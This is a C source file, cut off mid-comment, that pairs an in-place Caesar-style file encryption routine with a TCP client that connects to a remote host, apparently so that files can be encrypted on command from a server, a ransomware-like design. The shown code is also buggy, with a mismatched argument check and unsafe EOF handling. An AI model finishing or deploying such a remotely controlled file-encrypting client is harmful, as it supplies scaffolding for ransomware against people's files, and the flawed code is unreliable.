#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

#define MAX_PAYLOAD_LEN 256

void error(const char *msg) {
    perror(msg);
    exit(1);
}

/* 
 * encrypt_file: encrypts or decrypts a file using the Caesar algorithm
 * filename: name of the file to encrypt/decrypt
 * key: encryption/decryption key
 * encrypt: 1 to encrypt, 0 to decrypt
 */
void encrypt_file(const char *filename, int key, int encrypt) {
    FILE *file;
    char c;
    int i;

    if ((file = fopen(filename, "r+")) == NULL) {
        error("Error opening file");
    }

    while ((c = fgetc(file)) != EOF) {
        if (encrypt) {
            i = (c + key) % 256;
        } else {
            i = (c - key) % 256;
        }
        fseek(file, -1, SEEK_CUR);
        fputc(i, file);
    }

    fclose(file);
}

int main(int argc, char *argv[]) {
    int sockfd, portno, n;
    struct sockaddr_in serv_addr;
    struct hostent *server;

    char buffer[MAX_PAYLOAD_LEN];
    char filename[MAX_PAYLOAD_LEN];
    int key;
    int encrypt;

    fd_set readfds;
    struct timeval timeout;

    if (argc < 4) {
        fprintf(stderr, "usage %s hostname port\n", argv[0]);
        exit(1);
    }
    portno = atoi(argv[2]);
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        error("Error opening socket");
    }
    server = gethostbyname(argv[1]);
    if (server == NULL) {
        fprintf(stderr, "Error, no such host\n");
        exit(1);
    }
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    bcopy((char *) server->h_addr, (char *) &serv_addr.sin_addr.s_addr, server->h_length);
    serv_addr.sin_port = htons(portno);
    if (connect(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) {
        error("Error connecting");
    }
    printf("Connected to server\n");

    // select() allows
